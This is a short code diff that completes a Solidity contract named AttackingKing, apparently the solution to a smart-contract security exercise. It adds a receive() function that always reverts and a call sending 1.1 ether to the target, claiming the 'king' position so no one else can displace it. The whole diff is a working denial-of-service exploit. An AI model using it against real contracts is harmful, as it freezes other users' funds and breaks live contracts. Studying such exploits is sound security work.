@@ -10,7 +10,15 @@ contract AttackingKing {
         contractAddress = _contractAddress;
     }
 
+
+    receive() external payable {
+        // require(msg.sender != contractAddress, "Your money's no good here!");
+        revert();
+    }
+
     function hackContract() external {
         // Code me!
+        (bool success,) = address(contractAddress).call{value: 1.1 ether}("");
+        require(success, "Failed to send Ether");
     }
 }
